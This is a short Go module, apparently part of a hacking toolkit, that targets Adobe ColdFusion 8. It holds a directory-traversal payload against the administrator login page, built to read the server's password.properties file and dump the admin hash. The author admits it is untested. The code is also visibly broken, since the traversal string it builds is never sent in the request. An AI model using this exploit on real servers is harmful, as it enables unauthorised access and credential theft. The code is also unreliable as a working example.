// cold fusion exploitation and hash dumping script
// ive tried to test this but it was not 100% going to work or could be tested since i coudld not find or setup a adobe coldfusion server for cf8-9 exploitation
// but maybe this will work
package Coldfusion

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

var (
	Path     = "/CFIDE/administrator/enter.cfm"
	Locale   = "locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"
	Client   = &http.Client{}
	Password string
	Salt     string
)

func Make_Req(url string) {
	request, x := http.NewRequest("POST", url, nil)
	if x != nil {
		log.Fatal(x)
	} else {
		len := fmt.Sprintf("%v", len(Locale))
		request.Header = http.Header{
			"Host":           []string{url},
			"Content-Type":   []string{"application/x-www-form-urlencoded"},
			"Content-Length": []string{len},
		}
		response, z := Client.Do(request)
		if z != nil {
			log.Fatal(z)
		} else {
			if response.StatusCode == 200 {
				fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Success: Cold fusion bypassed, attempting to get passwords....")
			} else {
				log.Fatal("<RR6> Coldfusion Module: Could not fetch the correct response code...")
			}
			defer response.Body.Close()
			a, _ := ioutil.ReadAll(response.Body)
			fmt.Println(a)
		}
	}
}
